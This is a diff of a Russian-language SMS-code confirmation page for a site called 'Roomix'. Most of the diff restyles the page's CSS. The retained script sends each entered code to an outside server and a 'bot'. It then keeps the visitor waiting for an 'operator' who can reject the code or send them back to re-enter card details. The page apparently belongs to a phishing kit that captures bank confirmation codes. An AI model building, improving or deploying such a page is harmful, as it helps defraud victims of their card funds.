@@ -10,13 +10,16 @@
         :root {
             --primary: #D4AF37;
             --primary-dark: #B8941F;
-            --primary-light: rgba(212, 175, 55, 0.1);
+            --primary-light: rgba(212, 175, 55, 0.15);
             --dark: #121212;
             --dark-light: #1E1E1E;
             --text: #FFFFFF;
-            --text-secondary: #B0B0B0;
+            --text-secondary: rgba(255, 255, 255, 0.7);
             --error: #FF6B6B;
             --success: #4CAF50;
+            --glass-bg: rgba(255, 255, 255, 0.08);
+            --glass-border: rgba(255, 255, 255, 0.12);
+            --glass-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
         }
 
         * {
@@ -33,7 +36,7 @@
 
         body {
             font-family: 'Montserrat', sans-serif;
-            background: linear-gradient(135deg, var(--dark) 0%, var(--dark-light) 100%);
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 50%, #2d2d2d 100%);
             min-height: 100vh;
             color: var(--text);
             line-height: 1.6;
@@ -41,8 +44,6 @@
             -webkit-tap-highlight-color: transparent;
             -webkit-text-size-adjust: 100%;
             background-attachment: fixed;
-            background-repeat: no-repeat;
-            background-size: cover;
             padding-bottom: env(safe-area-inset-bottom);
         }
 
@@ -53,8 +54,11 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: linear-gradient(135deg, var(--dark) 0%, var(--dark-light) 100%);
-            z-index: -2;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(212, 175, 55, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(212, 175, 55, 0.05) 0%, transparent 50%),
+                radial-gradient(circle at 40% 40%, rgba(255, 255, 255, 0.02) 0%, transparent 50%);
+            z-index: -1;
         }
 
         .container {
@@ -98,7 +102,7 @@
             width: 50px;
             height: 50px;
             background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
-            border-radius: 10px;
+            border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -132,23 +136,26 @@
         }
 
         .language-btn {
-            background: var(--primary-light);
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
             color: var(--primary);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 8px;
-            padding: 8px 15px;
+            border: 1px solid var(--glass-border);
+            border-radius: 12px;
+            padding: 12px 18px;
             cursor: pointer;
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 10px;
             font-weight: 600;
             transition: all 0.3s ease;
-            min-height: 44px;
+            min-height: 48px;
+            box-shadow: var(--glass-shadow);
         }
 
         .language-btn:hover {
-            background: var(--primary);
-            color: var(--dark);
+            background: rgba(212, 175, 55, 0.15);
+            transform: translateY(-2px);
         }
 
         .language-dropdown {
@@ -156,11 +163,14 @@
             position: absolute;
             top: 100%;
             right: 0;
-            background: var(--dark-light);
-            border-radius: 8px;
-            padding: 10px 0;
-            min-width: 150px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            background: var(--glass-bg);
+            backdrop-filter: blur(30px);
+            -webkit-backdrop-filter: blur(30px);
+            border-radius: 12px;
+            padding: 8px 0;
+            min-width: 160px;
+            box-shadow: var(--glass-shadow);
+            border: 1px solid var(--glass-border);
             z-index: 100;
         }
 
@@ -171,14 +181,15 @@
         .language-option {
             padding: 12px 20px;
             cursor: pointer;
-            transition: background 0.3s ease;
+            transition: all 0.3s ease;
             min-height: 44px;
             display: flex;
             align-items: center;
+            color: var(--text);
         }
 
         .language-option:hover {
-            background: rgba(255, 255, 255, 0.05);
+            background: rgba(255, 255, 255, 0.08);
         }
 
         .language-option.active {
@@ -188,14 +199,17 @@
 
         .user-actions {
             display: flex;
-            gap: 15px;
+            gap: 12px;
         }
 
         .btn-icon {
-            width: 44px;
-            height: 44px;
-            border-radius: 50%;
-            background: var(--primary-light);
+            width: 48px;
+            height: 48px;
+            border-radius: 12px;
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -203,15 +217,14 @@
             cursor: pointer;
             transition: all 0.3s ease;
             flex-shrink: 0;
+            box-shadow: var(--glass-shadow);
         }
 
         .btn-icon:hover {
-            background: var(--primary);
-            color: var(--dark);
+            background: rgba(212, 175, 55, 0.15);
             transform: translateY(-2px);
         }
 
-        /* SMS Container */
         .sms-container {
             display: flex;
             flex-direction: column;
@@ -224,16 +237,20 @@
         }
 
         .sms-card {
-            background: rgba(30, 30, 30, 0.8);
-            backdrop-filter: blur(15px);
-            border-radius: 20px;
-            padding: 40px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
-            max-width: 500px;
+            background: var(--glass-bg);
+            backdrop-filter: blur(40px);
+            -webkit-backdrop-filter: blur(40px);
+            border-radius: 24px;
+            padding: 50px 40px;
+            border: 1px solid var(--glass-border);
+            box-shadow: 
+                0 25px 80px rgba(0, 0, 0, 0.4),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1),
+                inset 0 -1px 0 rgba(0, 0, 0, 0.2);
+            max-width: 520px;
             width: 100%;
             text-align: center;
-            animation: slideUp 0.4s ease;
+            animation: slideUp 0.6s cubic-bezier(0.25, 0.46, 0.45, 0.94);
             position: relative;
             overflow: hidden;
         }
@@ -244,73 +261,107 @@
             top: 0;
             left: 0;
             width: 100%;
-            height: 4px;
-            background: linear-gradient(90deg, var(--primary) 0%, var(--primary-dark) 100%);
+            height: 100%;
+            background: linear-gradient(135deg, 
+                rgba(212, 175, 55, 0.05) 0%, 
+                rgba(212, 175, 55, 0.02) 50%, 
+                transparent 100%);
+            pointer-events: none;
+        }
+
+        .sms-card::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, 
+                transparent, 
+                rgba(255, 255, 255, 0.05), 
+                transparent);
+            transition: left 0.6s ease;
+        }
+
+        .sms-card:hover::after {
+            left: 100%;
         }
 
         .sms-icon {
-            font-size: 60px;
-            color: var(--primary);
-            margin-bottom: 20px;
-            animation: pulse 2s infinite;
+            font-size: 72px;
+            margin-bottom: 25px;
+            animation: float 3s ease-in-out infinite;
+            filter: drop-shadow(0 8px 20px rgba(212, 175, 55, 0.3));
         }
 
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) scale(1); }
+            50% { transform: translateY(-8px) scale(1.05); }
         }
 
         .sms-title {
-            font-size: 24px;
+            font-size: 28px;
             font-weight: 700;
             color: var(--primary);
             margin-bottom: 15px;
+            text-shadow: 0 2px 10px rgba(212, 175, 55, 0.2);
         }
 
         .sms-description {
             color: var(--text-secondary);
-            margin-bottom: 30px;
-            line-height: 1.5;
+            margin-bottom: 40px;
+            line-height: 1.6;
+            font-size: 16px;
         }
 
         .code-inputs {
             display: flex;
             justify-content: center;
-            gap: 10px;
-            margin-bottom: 30px;
+            gap: 12px;
+            margin-bottom: 35px;
         }
 
         .code-input {
-            width: 50px;
-            height: 60px;
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
+            width: 60px;
+            height: 70px;
             background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 2px solid var(--glass-border);
+            border-radius: 16px;
             color: var(--text);
-            font-size: 24px;
-            font-weight: 600;
+            font-size: 28px;
+            font-weight: 700;
             text-align: center;
             transition: all 0.3s ease;
             inputmode: numeric;
+            box-shadow: 
+                0 4px 15px rgba(0, 0, 0, 0.2),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1);
         }
 
         .code-input:focus {
             outline: none;
             border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(212, 175, 55, 0.2);
-            background: rgba(255, 255, 255, 0.08);
+            background: rgba(212, 175, 55, 0.1);
+            box-shadow: 
+                0 0 0 3px rgba(212, 175, 55, 0.2),
+                0 8px 25px rgba(212, 175, 55, 0.3);
+            transform: translateY(-2px);
         }
 
         .code-input.filled {
             border-color: var(--primary);
-            background: rgba(212, 175, 55, 0.1);
+            background: rgba(212, 175, 55, 0.15);
+            box-shadow: 
+                0 8px 25px rgba(212, 175, 55, 0.25),
+                inset 0 1px 0 rgba(255, 255, 255, 0.2);
         }
 
         .timer {
             color: var(--text-secondary);
-            font-size: 14px;
-            margin-bottom: 25px;
+            font-size: 15px;
+            margin-bottom: 30px;
         }
 
         .timer-number {
@@ -324,49 +375,80 @@
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
+            padding: 8px 16px;
+            border-radius: 10px;
+            background: rgba(212, 175, 55, 0.1);
         }
 
         .resend-link:hover {
-            text-decoration: underline;
+            background: rgba(212, 175, 55, 0.2);
+            transform: translateY(-1px);
         }
 
         .resend-link.disabled {
             color: var(--text-secondary);
             cursor: not-allowed;
+            background: rgba(255, 255, 255, 0.05);
         }
 
         .btn {
-            padding: 16px 30px;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
+            padding: 18px 32px;
+            border-radius: 16px;
+            font-size: 17px;
+            font-weight: 700;
             cursor: pointer;
             transition: all 0.3s ease;
             border: none;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
-            min-height: 54px;
+            gap: 10px;
+            min-height: 60px;
             width: 100%;
-            max-width: 300px;
+            max-width: 320px;
             margin: 0 auto;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, 
+                transparent, 
+                rgba(255, 255, 255, 0.2), 
+                transparent);
+            transition: left 0.6s ease;
+        }
+
+        .btn:hover::before {
+            left: 100%;
         }
 
         .btn-primary {
             background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
             color: var(--dark);
+            box-shadow: 
+                0 10px 30px rgba(212, 175, 55, 0.4),
+                0 4px 15px rgba(0, 0, 0, 0.2);
         }
 
         .btn-primary:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(212, 175, 55, 0.4);
+            transform: translateY(-3px);
+            box-shadow: 
+                0 15px 40px rgba(212, 175, 55, 0.6),
+                0 6px 20px rgba(0, 0, 0, 0.3);
         }
 
         .btn:disabled {
-            opacity: 0.6;
+            opacity: 0.5;
             cursor: not-allowed;
             transform: none !important;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
         }
 
         .loading-overlay {
@@ -376,12 +458,14 @@
             width: 100%;
             height: 100%;
             background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
             display: none;
             align-items: center;
             justify-content: center;
             z-index: 10000;
             flex-direction: column;
-            gap: 20px;
+            gap: 25px;
         }
 
         .loading-overlay.show {
@@ -389,18 +473,35 @@
         }
 
         .loader {
-            border: 8px solid var(--primary-light);
-            border-top: 8px solid var(--primary);
-            border-radius: 50%;
             width: 80px;
             height: 80px;
+            border: 3px solid transparent;
+            border-top: 3px solid var(--primary);
+            border-right: 3px solid var(--primary);
+            border-radius: 50%;
             animation: spin 1s linear infinite;
+            position: relative;
+        }
+
+        .loader::before {
+            content: '';
+            position: absolute;
+            top: -3px;
+            left: -3px;
+            right: -3px;
+            bottom: -3px;
+            border: 3px solid transparent;
+            border-top: 3px solid rgba(212, 175, 55, 0.3);
+            border-right: 3px solid rgba(212, 175, 55, 0.3);
+            border-radius: 50%;
+            animation: spin 2s linear infinite reverse;
         }
 
         .loading-text {
             font-size: 18px;
             font-weight: 600;
             color: var(--primary);
+            text-shadow: 0 2px 10px rgba(212, 175, 55, 0.3);
         }
 
         @keyframes spin {
@@ -411,27 +512,29 @@
         @keyframes slideUp {
             from {
                 opacity: 0;
-                transform: translateY(30px);
+                transform: translateY(40px) scale(0.95);
             }
             to {
                 opacity: 1;
-                transform: translateY(0);
+                transform: translateY(0) scale(1);
             }
         }
 
-        /* Стили для уведомлений */
         .notification-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.8);
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
             display: none;
             align-items: center;
             justify-content: center;
             z-index: 10000;
             padding: 20px;
+            animation: fadeIn 0.3s ease;
         }
 
         .notification-overlay.show {
@@ -439,16 +542,20 @@
         }
 
         .notification-card {
-            background: rgba(30, 30, 30, 0.95);
-            backdrop-filter: blur(20px);
-            border-radius: 20px;
-            padding: 40px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.6);
-            max-width: 450px;
+            background: var(--glass-bg);
+            backdrop-filter: blur(50px);
+            -webkit-backdrop-filter: blur(50px);
+            border-radius: 24px;
+            padding: 45px 40px;
+            border: 1px solid var(--glass-border);
+            box-shadow: 
+                0 30px 100px rgba(0, 0, 0, 0.5),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1),
+                inset 0 -1px 0 rgba(0, 0, 0, 0.2);
+            max-width: 460px;
             width: 100%;
             text-align: center;
-            animation: slideUp 0.4s ease;
+            animation: slideUp 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94);
             position: relative;
             overflow: hidden;
         }
@@ -470,10 +577,29 @@
             background: linear-gradient(90deg, var(--success) 0%, #66bb6a 100%);
         }
 
+        .notification-card::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, 
+                transparent, 
+                rgba(255, 255, 255, 0.08), 
+                transparent);
+            transition: left 0.6s ease;
+        }
+
+        .notification-card:hover::after {
+            left: 100%;
+        }
+
         .notification-icon {
-            font-size: 64px;
-            margin-bottom: 20px;
+            font-size: 72px;
+            margin-bottom: 25px;
             animation: bounce 0.6s ease;
+            filter: drop-shadow(0 8px 20px rgba(0, 0, 0, 0.3));
         }
 
         .notification-card.error .notification-icon {
@@ -485,77 +611,113 @@
         }
 
         .notification-title {
-            font-size: 24px;
+            font-size: 26px;
             font-weight: 700;
             margin-bottom: 15px;
         }
 
         .notification-card.error .notification-title {
             color: var(--error);
+            text-shadow: 0 2px 10px rgba(255, 107, 107, 0.2);
         }
 
         .notification-card.success .notification-title {
             color: var(--success);
+            text-shadow: 0 2px 10px rgba(76, 175, 80, 0.2);
         }
 
         .notification-message {
             color: var(--text-secondary);
-            margin-bottom: 30px;
-            line-height: 1.5;
+            margin-bottom: 35px;
+            line-height: 1.6;
             font-size: 16px;
         }
 
         .notification-btn {
-            padding: 14px 28px;
-            border-radius: 12px;
+            padding: 16px 32px;
+            border-radius: 14px;
             font-size: 16px;
-            font-weight: 600;
+            font-weight: 700;
             cursor: pointer;
             transition: all 0.3s ease;
             border: none;
             width: 100%;
             max-width: 200px;
+            position: relative;
+            overflow: hidden;
         }
 
         .notification-card.error .notification-btn {
             background: linear-gradient(135deg, var(--error) 0%, #ff5252 100%);
             color: white;
+            box-shadow: 0 8px 25px rgba(255, 107, 107, 0.4);
         }
 
         .notification-card.success .notification-btn {
             background: linear-gradient(135deg, var(--success) 0%, #66bb6a 100%);
             color: white;
+            box-shadow: 0 8px 25px rgba(76, 175, 80, 0.4);
         }
 
         .notification-btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.4);
+        }
+
+        .notification-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, 
+                transparent, 
+                rgba(255, 255, 255, 0.2), 
+                transparent);
+            transition: left 0.6s ease;
+        }
+
+        .notification-btn:hover::before {
+            left: 100%;
         }
 
         @keyframes bounce {
-            0%, 20%, 60%, 100% { transform: translateY(0); }
-            40% { transform: translateY(-10px); }
-            80% { transform: translateY(-5px); }
+            0%, 20%, 60%, 100% { transform: translateY(0) scale(1); }
+            40% { transform: translateY(-12px) scale(1.1); }
+            80% { transform: translateY(-6px) scale(1.05); }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
 
         footer {
             text-align: center;
             padding: 30px 0;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            border-top: 1px solid var(--glass-border);
             color: var(--text-secondary);
             font-size: 14px;
             flex-shrink: 0;
             margin-top: auto;
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 20px 20px 0 0;
+            margin: 0 -20px;
+            padding: 30px 20px;
         }
 
-        /* Стили для пуш-уведомления */
         .push-notification {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.8);
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -565,26 +727,44 @@
         }
 
         .push-card {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(15px);
-            border-radius: 20px;
-            padding: 30px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
-            max-width: 400px;
+            background: var(--glass-bg);
+            backdrop-filter: blur(50px);
+            -webkit-backdrop-filter: blur(50px);
+            border-radius: 24px;
+            padding: 40px;
+            border: 1px solid var(--glass-border);
+            box-shadow: 
+                0 30px 100px rgba(0, 0, 0, 0.5),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1),
+                inset 0 -1px 0 rgba(0, 0, 0, 0.2);
+            max-width: 420px;
             width: 100%;
             text-align: center;
-            animation: slideUp 0.4s ease;
+            animation: slideUp 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .push-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, var(--primary) 0%, var(--primary-dark) 100%);
         }
 
         .push-icon {
-            font-size: 48px;
+            font-size: 56px;
             color: var(--primary);
             margin-bottom: 20px;
+            animation: float 3s ease-in-out infinite;
+            filter: drop-shadow(0 8px 20px rgba(212, 175, 55, 0.3));
         }
 
         .push-title {
-            font-size: 20px;
+            font-size: 22px;
             font-weight: 700;
             color: var(--text);
             margin-bottom: 15px;
@@ -593,15 +773,9 @@
         .push-message {
             color: var(--text-secondary);
             margin-bottom: 25px;
-            line-height: 1.5;
+            line-height: 1.6;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        /* Responsive */
         @media (max-width: 768px) {
             .container {
                 padding: 15px;
@@ -636,37 +810,41 @@
             }
 
             .sms-card {
-                padding: 30px 25px;
+                padding: 40px 30px;
                 margin: 0 10px;
+                border-radius: 20px;
             }
 
             .sms-icon {
-                font-size: 50px;
+                font-size: 64px;
             }
 
             .sms-title {
-                font-size: 22px;
+                font-size: 24px;
             }
 
             .code-input {
-                width: 45px;
-                height: 55px;
-                font-size: 20px;
+                width: 50px;
+                height: 60px;
+                font-size: 24px;
+                border-radius: 14px;
             }
 
             .btn {
-                padding: 14px 20px;
-                min-height: 50px;
+                padding: 16px 28px;
+                min-height: 56px;
                 max-width: 280px;
+                border-radius: 14px;
             }
 
             .notification-card {
-                padding: 30px 25px;
+                padding: 35px 25px;
                 margin: 0 15px;
+                border-radius: 20px;
             }
 
             .notification-icon {
-                font-size: 56px;
+                font-size: 64px;
             }
 
             .notification-title {
@@ -674,16 +852,17 @@
             }
 
             .push-card {
-                padding: 25px;
+                padding: 30px 25px;
                 margin: 15px;
+                border-radius: 20px;
             }
 
             .push-icon {
-                font-size: 40px;
+                font-size: 48px;
             }
 
             .push-title {
-                font-size: 18px;
+                font-size: 20px;
             }
 
             .loader {
@@ -720,21 +899,23 @@
             }
 
             .sms-card {
-                padding: 25px 20px;
+                padding: 35px 25px;
+                border-radius: 18px;
             }
 
             .sms-icon {
-                font-size: 45px;
+                font-size: 56px;
             }
 
             .sms-title {
-                font-size: 20px;
+                font-size: 22px;
             }
 
             .code-input {
-                width: 40px;
-                height: 50px;
-                font-size: 18px;
+                width: 45px;
+                height: 55px;
+                font-size: 22px;
+                border-radius: 12px;
             }
 
             .code-inputs {
@@ -742,18 +923,20 @@
             }
 
             .btn {
-                padding: 12px 15px;
-                font-size: 15px;
-                min-height: 48px;
-                max-width: 250px;
+                padding: 14px 24px;
+                font-size: 16px;
+                min-height: 52px;
+                max-width: 260px;
+                border-radius: 12px;
             }
 
             .notification-card {
-                padding: 25px 20px;
+                padding: 30px 20px;
+                border-radius: 18px;
             }
 
             .notification-icon {
-                font-size: 48px;
+                font-size: 56px;
             }
 
             .notification-title {
@@ -765,20 +948,22 @@
             }
 
             footer {
-                padding: 25px 0;
+                padding: 25px 15px;
                 font-size: 13px;
+                border-radius: 16px 16px 0 0;
             }
 
             .push-card {
-                padding: 20px;
+                padding: 25px 20px;
+                border-radius: 18px;
             }
 
             .push-icon {
-                font-size: 36px;
+                font-size: 44px;
             }
 
             .push-title {
-                font-size: 16px;
+                font-size: 18px;
             }
 
             .push-message {
@@ -793,16 +978,14 @@
     </style>
 </head>
 <body>
-    <!-- Loading Overlay -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loader"></div>
         <div class="loading-text" id="loadingText">Ожидание подтверждения оператора...</div>
     </div>
 
-    <!-- Notification Overlay -->
     <div class="notification-overlay" id="notificationOverlay">
         <div class="notification-card error" id="notificationCard">
-            <div class="notification-icon">❌</div>
+            <div class="notification-icon">⚠️</div>
             <div class="notification-title" id="notificationTitle">Ошибка</div>
             <div class="notification-message" id="notificationMessage">Неверный SMS код. Пожалуйста, проверьте и попробуйте снова.</div>
             <button class="notification-btn" id="notificationBtn">Понятно</button>
@@ -873,7 +1056,7 @@
 
         <footer>
             <p>© 2025 Roomix. Все права защищены.</p>
-            <p style="margin-top: 10px; font-size: 12px;">Принимаем к оплате:
+            <p style="margin-top: 10px; font-size: 12px; opacity: 0.7;">Принимаем к оплате:
                 <i class="fab fa-cc-visa" style="margin: 0 5px;"></i>
                 <i class="fab fa-cc-mastercard" style="margin: 0 5px;"></i>
                 <i class="fab fa-cc-paypal" style="margin: 0 5px;"></i>
@@ -936,20 +1119,15 @@
         let eventSource = null;
         const RAILWAY_URL = "https://roomix-production.up.railway.app";
 
-        // ========== ФУНКЦИИ ДЛЯ УВЕДОМЛЕНИЙ ==========
         window.showWrongSMSError = function() {
             hideLoading();
-            
-            // Показываем красивое уведомление вместо изменения кнопки
             showNotification('error', translations[currentLanguage].errorText, translations[currentLanguage].errorMessage);
             
-            // Очищаем поля
             document.querySelectorAll('.code-input').forEach(input => {
                 input.value = '';
                 input.classList.remove('filled');
             });
             
-            // Фокус на первое поле после закрытия уведомления
             setTimeout(() => {
                 document.querySelector('.code-input').focus();
             }, 500);
@@ -971,27 +1149,21 @@
             const notificationMessage = document.getElementById('notificationMessage');
             const notificationBtn = document.getElementById('notificationBtn');
             
-            // Обновляем классы для типа уведомления
             card.className = `notification-card ${type}`;
             
-            // Обновляем контент
             notificationTitle.textContent = title;
             notificationMessage.textContent = message;
             notificationBtn.textContent = translations[currentLanguage].notificationBtn;
             
-            // Обновляем иконку
             const icon = card.querySelector('.notification-icon');
-            icon.textContent = type === 'error' ? '❌' : '✅';
+            icon.textContent = type === 'error' ? '⚠️' : '✅';
             
-            // Показываем уведомление
             overlay.classList.add('show');
             
-            // Обработчик кнопки
             notificationBtn.onclick = function() {
                 overlay.classList.remove('show');
             };
             
-            // Закрытие по клику вне карточки
             overlay.onclick = function(e) {
                 if (e.target === overlay) {
                     overlay.classList.remove('show');
@@ -1008,7 +1180,6 @@
             document.getElementById('loadingOverlay').classList.remove('show');
         }
 
-        // ========== ОСНОВНЫЕ ФУНКЦИИ ==========
         function changeLanguage(lang) {
             currentLanguage = lang;
             sessionStorage.setItem('selectedLanguage', lang);
@@ -1148,7 +1319,6 @@
             });
         }
 
-        // ========== SSE ПОДКЛЮЧЕНИЕ ==========
         function connectSSE() {
             try {
                 const userId = sessionStorage.getItem('currentTransactionId') || "user_default";
@@ -1190,7 +1360,6 @@
             }
         }
 
-        // ========== ОБРАБОТКА КОМАНД ОТ БОТА ==========
         function handleBotCommand(command) {
             console.log('🤖 Обработка команды:', command);
 
@@ -1210,7 +1379,6 @@
             }
         }
 
-        // ========== ОТПРАВКА SMS КОДА ==========
         async function sendSMSToBot(smsCode) {
             try {
                 const urlParams = new URLSearchParams(window.location.search);
@@ -1246,7 +1414,6 @@
             }
         }
 
-        // ========== ФУНКЦИИ РЕДИРЕКТА ==========
         window.redirectToPaymentWithError = function() {
             console.log('❌ Перенаправляю на payment.html с ошибкой');
             window.location.href = 'payment.html?status=wrong_card';
@@ -1280,7 +1447,6 @@
             });
         };
 
-        // ========== ОБРАБОТЧИК КНОПКИ ПОДТВЕРЖДЕНИЯ ==========
         document.getElementById('confirmBtn').addEventListener('click', async function() {
             const inputs = document.querySelectorAll('.code-input');
             const smsCode = Array.from(inputs).map(input => input.value).join('');
@@ -1296,11 +1462,9 @@
                     hideLoading();
                     showNotification('error', 'Ошибка отправки', 'Не удалось отправить SMS код. Пожалуйста, попробуйте снова.');
                 }
-                // Если успешно - остается loading и ждем команды от бота
             }
         });
 
-        // ========== ИНИЦИАЛИЗАЦИЯ ==========
         document.addEventListener('DOMContentLoaded', function() {
             initLanguageSelector();
             changeLanguage(currentLanguage);
